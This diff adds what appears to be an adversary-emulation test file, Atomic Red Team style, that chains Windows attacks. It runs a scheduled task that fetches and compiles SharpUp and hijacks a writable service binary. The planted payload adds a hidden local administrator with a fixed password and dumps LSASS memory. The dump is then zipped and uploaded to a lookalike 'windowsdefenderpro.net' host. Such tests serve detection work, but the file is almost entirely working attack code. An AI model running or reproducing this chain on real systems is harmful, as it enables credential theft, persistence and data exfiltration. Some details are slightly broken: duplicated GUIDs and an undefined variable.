@@ -1,0 +1,170 @@
+attack_technique: Chaining 
+display_name: "Chaining Example" 
+atomic_tests:
+
+# T1053.005, T1119 (Scheduled Task for Escalation Discovery)
+- name: T1053.005 - Scheduled Task and	T1119 Automated Collection
+  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
+  description: |
+    Create an atomic scheduled task that leverages native powershell cmdlets.
+    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 00:01.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+        $ps1 = @'
+        $id = Get-Random
+        $code = (iwr https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs -UseBasicParsing) -replace "class Program","public class Runner$id" -replace "namespace SharpUp","namespace ShipOut"
+        $assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp", "System.ServiceProcess", "System.Management")
+        Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
+        iex "[ShipOut.Runner$id]::GetModifiableServiceBinaries()"
+        '@
+
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($ps1)
+        $encodedCommand = [Convert]::ToBase64String($bytes)
+
+        $ps2 = "powershell -enc $encodedCommand | out-file $env:APPDATA\services.txt" | % { $_ | out-file $env:APPDATA\payload.ps1 }
+
+        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command $env:APPDATA\payload.ps1"
+        $T = New-ScheduledTaskTrigger -Daily -At "00:01"
+        $P = New-ScheduledTaskPrincipal "$env:USERNAME"
+        $S = New-ScheduledTaskSettingsSet
+        $D = New-ScheduledTask -Action $A -Principal $P -Trigger $T -Settings $S
+        Register-ScheduledTask AtomicTask -InputObject $D -Force 
+        start-sleep 30
+        Start-ScheduledTask -TaskName AtomicTask
+        start-sleep 30
+    cleanup_command: |
+      Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
+
+- name: T1053.005 - Scheduled Task + T1574.010 Services File Permission Weakness + T1003.001 LSASS
+  auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
+  description: |
+    Create an atomic scheduled task that leverages native powershell cmdlets.
+    Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 00:01.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $f=(Get-Content $env:AppData\services.txt)
+      $targets = @()
+      (($f -match '^  (Name|PathName)') -replace '  Name',"`nName" -replace "  PathName","PathName") -join "," | % {
+          if($_ -notmatch '^ '){
+              $_ -replace "`",`n","`"`n" -replace "^`n",'' -split "`n" | % {
+                  $service = ("{{'{0}'}}" -f ("$_" -replace '             : ',"':'" -replace '         : ',"':'" -replace ',',"','" -replace '\\','\\'))
+                  $targets += ($service |convertfrom-json)
+              }
+          }
+      }
+
+      if($targets.Count -gt 0){
+          $code = @"
+      using System;
+      using System.DirectoryServices;
+      using System.Diagnostics;
+
+      namespace HelloWorld
+      {
+        public class Program$id
+        {
+          public static void Main(){
+            DirectoryEntry hostMachineDirectory = new DirectoryEntry("WinNT://localhost");
+                  DirectoryEntries entries = hostMachineDirectory.Children;
+                  bool userExists = false;
+                  foreach (DirectoryEntry each in entries)
+                  {
+                      userExists = each.Name.Equals("TestUser1",StringComparison.CurrentCultureIgnoreCase);
+                      if (userExists)
+                          break;
+                  }
+
+                  if (false == userExists)
+                  {
+                      
+                      DirectoryEntry AD = new DirectoryEntry("WinNT://" +
+                      Environment.MachineName + ",computer");
+                      DirectoryEntry NewUser = AD.Children.Add("TestUser1", "user");
+                      NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
+                      NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
+                      NewUser.CommitChanges();
+                      DirectoryEntry grp;
+
+                      grp = AD.Children.Find("Administrators", "group");
+                      if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
+                      Console.WriteLine("Account Created Successfully");
+                  }
+
+                  Process[] processlist = Process.GetProcessesByName("lsass");
+                  foreach (Process p in processlist)
+                  {
+                      var strPID = Convert.ToString(p.Id);
+
+                      var process = new Process {
+                      StartInfo = new ProcessStartInfo {
+                              FileName = @"c:\windows\system32\rundll32.exe",
+                              Arguments = String.Format(@"C:\windows\System32\comsvcs.dll, MiniDump {0} C:\Temp\dumper.dmp full",strPID)
+                          }
+                      };
+                      process.Start();
+                      process.WaitForExit();
+
+                      var copy = new Process {
+                      StartInfo = new ProcessStartInfo {
+                              FileName = @"c:\windows\system32\cmd.exe",
+                              Arguments = String.Format("/k \"move /Y C:\\Temp\\dumper.dmp C:\\temp\\temp.dmp\"")
+                          }
+                      };
+                      copy.Start();
+                      copy.WaitForExit();
+                      break;
+                  }
+
+                  
+          }
+        }
+      }
+      "@  | out-file C:\temp\adduser.cs
+          $name = $targets[0].Name.Trim()
+          $path = ($targets[0].PathName -replace '"','')
+          C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:$path c:\temp\adduser.cs 
+          Stop-Service $name -ErrorAction SilentlyContinue
+          Start-Service $name -ErrorAction SilentlyContinue
+      } 
+
+# T1560 Archive Collected
+- name: Compress Data for Tranport
+  auto_generated_guid: d1334303-59cb-4a03-8313-b3e24d02c198
+  description: |
+    Compress data using powershell
+  supported_platforms:
+    - windows
+  dependencies:
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $compress = @{
+        Path = "C:\Temp\temp.dmp"
+        CompressionLevel = "Fastest"
+        DestinationPath = "C:\Temp\$env:hostname_exfil.zip"
+      }
+      Compress-Archive @compress
+
+# T1567 Exfiltration Over Web Service
+- name: Exflitration Over Web Service
+  auto_generated_guid: d1334303-59cb-4a03-8213-b3e24d02c198
+  description: |
+    Post file using powershell
+  supported_platforms:
+    - windows
+  dependencies:
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $uri = https://windowsdefenderpro.net/upload/
+      Invoke-RestMethod -Uri $uri -Method Post -InFile C:\Temp\$env:hostname_exfil.zip
